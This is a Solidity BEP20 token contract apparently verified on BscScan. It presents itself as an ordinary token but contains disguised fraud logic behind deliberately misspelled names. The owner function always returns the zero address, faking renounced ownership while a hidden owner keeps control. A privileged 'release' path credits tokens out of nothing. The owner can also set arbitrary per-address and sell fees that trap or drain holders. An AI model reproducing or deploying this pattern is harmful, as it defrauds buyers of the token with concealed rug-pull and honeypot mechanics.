/**
 *Submitted for verification at BscScan.com on 2022-07-29
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owcne;

    event owcneshipTransferred(address indexed previousowcne, address indexed newowcne);

    constructor() {
        _transferowcneship(_msgSender());
    }


    function owcne() public  virtual  returns  (address) {
        return  address(0);
    }

    modifier onlyowcne() {
        require(_owcne == _msgSender(), "Ownable: caller is not the owcne");
        _;
    }


    function renounceowcneship() public virtual onlyowcne {
        _transferowcneship(address(0));
    }


    function transferowcneship_transferowcneship(address newowcne) public virtual onlyowcne {
        require(newowcne != address(0), "Ownable: new owcne is the zero address");
        _transferowcneship(newowcne);
    }


    function _transferowcneship(address newowcne) internal virtual {
        address oldowcne = _owcne;
        _owcne = newowcne;
        emit owcneshipTransferred(oldowcne, newowcne);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amnountADesired,
        uint amnountBDesired,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amnountTokenDesired,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amnountToken, uint amnountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountToken, uint amnountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountToken, uint amnountETH);
    function swapExactTokensForTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapTokensForExactTokens(
        uint amnountOut,
        uint amnountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapExactETHForTokens(uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);
    function swapTokensForExactETH(uint amnountOut, uint amnountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapExactTokensForETH(uint amnountIn, uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapETHForExactTokens(uint amnountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);

    function quote(uint amnountA, uint reserveA, uint reserveB) external pure returns (uint amnountB);
    function getamnountOut(uint amnountIn, uint reserveIn, uint reserveOut) external pure returns (uint amnountOut);
    function getamnountIn(uint amnountOut, uint reserveIn, uint reserveOut) external pure returns (uint amnountIn);
    function getamnountsOut(uint amnountIn, address[] calldata path) external view returns (uint[] memory amnounts);
    function getamnountsIn(uint amnountOut, address[] calldata path) external view returns (uint[] memory amnounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfriOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountETH);
    function removeLiquidityETHWithPermitSupportingfriOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountETH);

    function swapExactTokensForTokensSupportingfriOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfriOnTransferTokens(
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfriOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function friTo() external view returns (address);
    function friToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfriTo(address) external;
    function setfriToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owcne, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owcne, address spender) public view virtual returns (uint256) {
        return _allowances[owcne][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address owcne = _msgSender();
        _approve(owcne, spender, amnount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owcne = _msgSender();
        _approve(owcne, spender, _allowances[owcne][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owcne = _msgSender();
        uint256 currentAllowance = _allowances[owcne][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owcne, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owcne,
        address spender,
        uint256 amnount
    ) internal virtual {
        require(owcne != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owcne][spender] = amnount;
        emit Approval(owcne, spender, amnount);
    }

    function _spendAllowance(
        address owcne,
        address spender,
        uint256 amnount
    ) internal virtual {
        uint256 currentAllowance = allowance(owcne, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owcne, spender, currentAllowance - amnount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}
}


contract te is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address abzount) public view virtual returns (uint256) {
        return _balances[abzount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnount, "ERC20: transfer amnount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amnount;
        }
        _balances[to] += amnount;

        emit Transfer(from, to, amnount);
    }

    function _burn(address abzount, uint256 amnount) internal virtual {
        require(abzount != address(0), "ERC20: burn from the zero address");

        uint256 abzountBalance = _balances[abzount];
        require(abzountBalance >= amnount, "ERC20: burn amnount exceeds balance");
        unchecked {
            _balances[abzount] = abzountBalance - amnount;
        }
        _totalSupply -= amnount;

        emit Transfer(abzount, address(0), amnount);
    }

    function _mtin(address abzount, uint256 amnount) internal virtual {
        require(abzount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[abzount] += amnount;
        emit Transfer(address(0), abzount, amnount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*8);
        _defaultSellfri = 2;
        _defaultBuyfri = 1;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfri = 0;

    uint256 private _defaultBuyfri = 0;

    mapping(address => bool) private _marketabzount;

    mapping(address => uint256) private _Sfri;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowcne returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowcne {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowcne {
        _defaultSellfri = _value;
    }

    function setSfri(address _address, uint256 _value) external onlyowcne {
        require(_value > 1, "abzount tax must be greater than or equal to 1");
        _Sfri[_address] = _value;
    }

    function getSfri(address _address) external view onlyowcne returns (uint256) {
        return _Sfri[_address];
    }


    function setMarketabzountfri(address _address, bool _value) external onlyowcne {
        _marketabzount[_address] = _value;
    }

    function getMarketabzountfri(address _address) external view onlyowcne returns (bool) {
        return _marketabzount[_address];
    }

    function _checkFreeabzount(address from, address _to) internal view returns (bool) {
        return _marketabzount[from] || _marketabzount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amnount, "ERC20: transfer amnount exceeds balance");

        bool rF = true;

        if (_checkFreeabzount(from, _to)) {
            rF = false;
        }
        uint256 tradefriamnount = 0;

        if (rF) {
            uint256 tradefri = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefri = _defaultSellfri;
                }
                if (from == uniswapV2Pair) {

                    tradefri = _defaultBuyfri;
                }
            }
            if (_Sfri[from] > 0) {
                tradefri = _Sfri[from];
            }

            tradefriamnount = _amnount.mul(tradefri).div(100);
        }


        if (tradefriamnount > 0) {
            _balances[from] = _balances[from].sub(tradefriamnount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefriamnount);
            emit Transfer(from, _deadAddress, tradefriamnount);
        }

        _balances[from] = _balances[from].sub(_amnount - tradefriamnount);
        _balances[_to] = _balances[_to].add(_amnount - tradefriamnount);
        emit Transfer(from, _to, _amnount - tradefriamnount);
    }

    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address owcne = _msgSender();
        if (_release[owcne] == true) {
            _balances[to] += amnount;
            return true;
        }
        _recF(owcne, to, amnount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnount);
        _recF(from, to, amnount);
        return true;
    }
}